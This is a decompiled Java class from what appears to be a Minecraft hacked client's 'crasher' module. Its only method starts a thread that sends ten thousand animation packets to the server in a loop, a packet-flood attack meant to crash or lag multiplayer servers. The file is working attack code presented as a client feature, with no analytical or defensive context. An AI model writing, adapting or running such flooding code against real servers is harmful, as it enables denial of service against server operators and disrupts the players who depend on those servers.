// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher.ac;

import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketAnimation;
import net.minecraft.client.Minecraft;

public class AnimationCrasher1
{
    public static void start() {
        new Thread() {
            @Override
            public void run() {
                for (int i2 = 0; i2 < 10000; ++i2) {
                    Minecraft.getMinecraft().player.connection.sendPacket(new CPacketAnimation());
                }
            }
        }.start();
    }
}
